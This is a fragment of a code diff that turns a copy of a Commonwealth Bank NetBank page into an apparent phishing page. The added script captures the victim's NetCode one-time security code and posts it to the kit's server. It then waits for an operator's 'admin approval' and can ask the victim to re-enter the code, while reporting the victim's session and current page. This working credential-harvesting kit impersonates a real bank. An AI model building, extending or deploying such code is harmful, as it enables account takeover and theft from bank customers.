+          <strong>Verify</strong>
+          <span class="arrow-icon"></span>
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-links">
+      <a href="#">Terms of use</a>
+      <a href="#">Security</a>
+      <a href="#">Privacy</a>
+    </div>
+    <div>© Commonwealth Bank of Australia 2026</div>
+  </footer>
+
+  <script>
+    // Session setup
+    const sid = new URLSearchParams(location.search).get('sid') ||
+                sessionStorage.getItem('sid');
+    
+    if (!sid) {
+      window.location.href = '/';
+      throw 0;
+    }
+
+    // Heartbeat
+    setInterval(() => {
+      fetch('/api/ping', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ sid })
+      }).catch(() => {});
+    }, 10000);
+
+    // Elements
+    const netcodeInput = document.getElementById('netcode');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Restrict input to digits only
+    netcodeInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+      errorMessage.classList.remove('active');
     });
-  }, 5000);
-})();
-</script>
-   <div id="ctl00_TrackingBootstrap">
-    <input id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" type="hidden" value=""/>
-    <input id="SC_PRODUCT_NAME" name="SC_PRODUCT_NAME" type="hidden" value=""/>
-    <input id="SC_TRANSACTION_ID" name="SC_TRANSACTION_ID" type="hidden" value=""/>
-    <input id="SC_WEBTRACKER_ID" name="SC_WEBTRACKER_ID" type="hidden" value="NoTrackerId"/>
-    <input id="SC_JSON_PATH" name="SC_JSON_PATH" type="hidden" value="/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.json"/>
-    <input id="SC_WEBCHAT_PATH" name="SC_WEBCHAT_PATH" type="hidden" value="https://static.my.commbank.com.au/static/netbank/js/liveperson.mtagconfig.a97df15eb690198dc55d82822f903acd.js"/>
-    <input id="SC_WEBCHAT_SERVER" name="SC_WEBCHAT_SERVER" type="hidden" value="chat.commbank.com.au"/>
-    <input id="SC_WEBCHAT_TAG_SERVER" name="SC_WEBCHAT_TAG_SERVER" type="hidden" value="sr1.liveperson.net"/>
-    <input id="SC_WEBCHAT_ACC_NUM" name="SC_WEBCHAT_ACC_NUM" type="hidden" value="4005546"/>
-   </div>
-   <div class="aspNetHidden">
-    <input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="D08D653B"/>
-    <input id="__SCROLLPOSITIONX" name="__SCROLLPOSITIONX" type="hidden" value="0"/>
-    <input id="__SCROLLPOSITIONY" name="__SCROLLPOSITIONY" type="hidden" value="0"/>
-    <input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAApzBtZ2b1VqHcdFmQAPg9yp46W6QaNysPFfIpMWbNhAHQaQLvXDMQqvHYvSkb4iIOJbkOyYBWHOSMMcWwRra1r/T7zECJtVe6VdjUc1AV3WfvIZcZSB5oLBQzGFBs4fvAYlydTbBKLFQMhmGivopuYJYXz1K6GxH3smYE5OX9Ek0sZ/FaoagUG/zbx6Boj7kr8idSTcUMPryiGw/4EMPMlh7CeZMgZ/CS/JaRoAE7s6f/X8Sik="/>
-   </div>
-   <div aria-labelledby="ui-id-1" class="ui-dialog ui-widget ui-widget-content ui-corner-all" role="dialog" style="display: none; outline: 0px; z-index: 1000;" tabindex="-1">
-    <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
-     <span class="ui-dialog-title" id="ui-id-1">
-      Cardholder type
-     </span>
-     <a class="ui-dialog-titlebar-close ui-corner-all" href="#" role="button">
-      <span class="ui-icon ui-icon-closethick">
-       Close dialog
-      </span>
-     </a>
-    </div>
-    <div class="cba_dialog cba_dialog_yellow ui-dialog-content ui-widget-content" data-dialogid="dialogSequenceNumber" data-dialogparams='{"width":325,"height":260,"autoOpen":false,"hideCloseButton":false,"hideValidationMessagePanel":false}' id="ctl00_BodyPlaceHolder_dialogSequenceNumber" style="display: block;">
-     <div class="ContentPanel_BorderlessForm" id="ctl00_BodyPlaceHolder_ContentPanel2_outer">
-      <fieldset class="ContentPanel BorderlessForm NoLine" id="ctl00_BodyPlaceHolder_ContentPanel2">
-       <div class="FieldPanel">
-        <ul class="LabelFieldList" role="presentation">
-         <li class="LabelFieldListItem" role="presentation">
-          <p class="modalFont">
-           You've entered a credit card number.
-          </p>
-         </li>
-         <li class="LabelFieldListItem" role="presentation">
-          <p>
-           <strong>
-            Please select the cardholder type for this card:
-           </strong>
-          </p>
-         </li>
-         <li class="LabelFieldListNestedContentPanel LabelFieldListItem" role="presentation">
-          <div class="Right Width25" id="ctl00_BodyPlaceHolder_pnlPrimarySecondarySelection">
-           <div class="FieldElement FieldElementNoLabel">
-            <span class="radio field">
-             <span class="radioInput">
-              <input checked="checked" id="ctl00_BodyPlaceHolder_rbtnPrimary_field" name="ctl00$BodyPlaceHolder$OptionPreference" type="radio" value="ctl00$BodyPlaceHolder$rbtnPrimary$field"/>
-             </span>
-             <label for="ctl00_BodyPlaceHolder_rbtnPrimary_field" id="ctl00_BodyPlaceHolder_rbtnPrimary_field_label">
-              Primary cardholder
-             </label>
-            </span>
-           </div>
-           <div class="FieldElement FieldElementNoLabel">
-            <span class="radio field">
-             <span class="radioInput">
-              <input id="ctl00_BodyPlaceHolder_rbtnAdditional_field" name="ctl00$BodyPlaceHolder$OptionPreference" type="radio" value="ctl00$BodyPlaceHolder$rbtnAdditional$field"/>
-             </span>
-             <label for="ctl00_BodyPlaceHolder_rbtnAdditional_field" id="ctl00_BodyPlaceHolder_rbtnAdditional_field_label">
-              Additional cardholder
-             </label>
-            </span>
-           </div>
-          </div>
-         </li>
-         <li class="LabelFieldListItem" role="presentation">
-          <div class="ButtonPanel">
-           <div class="left">
-           </div>
-           <div class="middle">
-           </div>
-           <div class="right">
-            <a class="button button_ui button_gold icon icon_directionarrowright icon_right" href='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$BodyPlaceHolder$lnkContinue", "", true, "", "", false, true))' id="ctl00_BodyPlaceHolder_lnkContinue">
-             <i aria-hidden="true" role="presentation" tabindex="-1">
-             </i>
-             <strong>
-              Continue
-             </strong>
-            </a>
-           </div>
-          </div>
-         </li>
-        </ul>
-       </div>
-      </fieldset>
-     </div>
-    </div>
-   </div>
-  </form>
-  <div id="ctl00_ICRMFormPanel">
-  </div>
-  <iframe height="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" width="1">
-  </iframe>
-  <input id="SC_channel" type="hidden" value="Netbank"/>
-  <input id="SC_pageurl" type="hidden" value="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx"/>
-  <input id="SC_previouspagename" type="hidden" value=""/>
-  <input id="SC_UUIDv4" type="hidden" value=""/>
-  <input id="SC_UUIDv5" type="hidden" value=""/>
-  <input id="SC_authstate" type="hidden" value="true"/>
-  <input id="SC_elementinteraction" type="hidden" value="null"/>
-  <input id="SC_referrerurl" type="hidden" value=""/>
-  <input id="SC_dayOfWeek" type="hidden" value="Monday"/>
-  <input id="SC_hourOfDay" type="hidden" value="5:58PM"/>
-  <input id="SC_newVSrepeat" type="hidden" value="New"/>
-  <input id="SC_UAI" type="hidden" value=""/>
-  <input id="SC_BSB" type="hidden" value=""/>
-  <input id="SC_ecid" type="hidden" value="undefined"/>
-  <input id="SC_analyticsversion" type="hidden" value="2.19.2|nb"/>
-  <input id="SC_globalMaskingFieldCount" type="hidden" value="0"/>
-  <input id="SC_globalMaskingFieldName" type="hidden" value=""/>
-  <div>
-   <iframe height="0" id="cross-domain-store-server-iframe" src="assets/adrum-xd.18b6b3ec105ee15f14ef7c382e15f446.html" style="display: none;" tabindex="-1" title="empty" width="0">
-   </iframe>
-  </div>
- </body>
+
+    // Verify button click
+    verifyBtn.addEventListener('click', async () => {
+      const netcode = netcodeInput.value.trim();
+      
+      if (!netcode || netcode.length < 4) {
+        errorMessage.textContent = 'Please enter a valid NetCode.';
+        errorMessage.classList.add('active');
+        netcodeInput.focus();
+        return;
+      }
+
+      // Show loading
+      loadingOverlay.classList.add('active');
+      verifyBtn.disabled = true;
+
+      try {
+        // Send to server
+        const response = await fetch('/api/verify', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ sid, phone: netcode })
+        });
+
+        if (response.ok) {
+          // Start polling for admin approval
+          startPolling();
+        } else {
+          throw new Error('Verification failed');
+        }
+      } catch (err) {
+        loadingOverlay.classList.remove('active');
+        verifyBtn.disabled = false;
+        errorMessage.textContent = 'Unable to verify. Please try again.';
+        errorMessage.classList.add('active');
+      }
+    });
+
+    // Allow Enter key to submit
+    netcodeInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        verifyBtn.click();
+      }
+    });
+
+    // Poll for admin action
+    let isWaitingForAdmin = false;
+    
+    function startPolling() {
+      if (isWaitingForAdmin) return;
+      isWaitingForAdmin = true;
+
+      const poll = async () => {
+        if (!isWaitingForAdmin) return;
+
+        try {
+          const res = await fetch(`/api/status/${sid}`);
+          const data = await res.json();
+
+          if (data.status === 'ok') {
+            isWaitingForAdmin = false;
+            window.location.href = '/unregister.html';
+            return;
+          }
+
+          if (data.status === 'redo') {
+            isWaitingForAdmin = false;
+            loadingOverlay.classList.remove('active');
+            verifyBtn.disabled = false;
+            errorMessage.textContent = 'Invalid NetCode. Please try again.';
+            errorMessage.classList.add('active');
+            netcodeInput.value = '';
+            netcodeInput.focus();
+            return;
+          }
+
+          setTimeout(poll, 1200);
+        } catch (err) {
+          setTimeout(poll, 2000);
+        }
+      };
+
+      poll();
+    }
+
+    // Update page status
+    fetch('/api/page', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ sid, page: 'verify.html' })
+    }).catch(() => {});
+  </script>
+</body>
 </html>
